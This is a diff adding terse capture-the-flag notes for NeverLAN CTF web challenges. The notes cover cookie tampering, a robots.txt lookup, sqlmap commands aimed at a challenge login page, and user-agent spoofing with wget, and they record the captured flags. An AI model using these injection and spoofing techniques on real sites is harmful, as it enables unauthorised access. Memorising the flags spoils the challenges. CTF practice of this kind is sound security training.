@@ -1,0 +1,23 @@
+CookieMonster
+	change cookie value to 'Elmo'
+	flag{YummyC00k13s}
+
+StopTheBot
+	robots.txt
+	flag{n0_b0ts_all0w3d}
+
+SqlBreaker
+	https://challenges.neverlanctf.com:1160/login.php?username=asd&password=asd
+	sqlmap -u https://challenges.neverlanctf.com:1160/login.php --banner
+	sqlmap -u https://challenges.neverlanctf.com:1160/login.php --banner --data=username=asd&password=asd -p username,password
+
+FollowMe!
+	https://7aimehagbl.neverlanctf.com
+	nginx
+
+BrowserBias
+	https://challenges.neverlanctf.com:1130
+	Sorry, this site is only optimized for browsers that run on commodo 64 
+	"Contiki/1.0 (Commodore 64; http://dunkels.com/adam/contiki/)"
+	wget -U "Contiki/1.0 (Commodore 64; http://dunkels.com/adam/contiki/)" https://challenges.neverlanctf.com:1130
+	flag{8b1t_w3b}
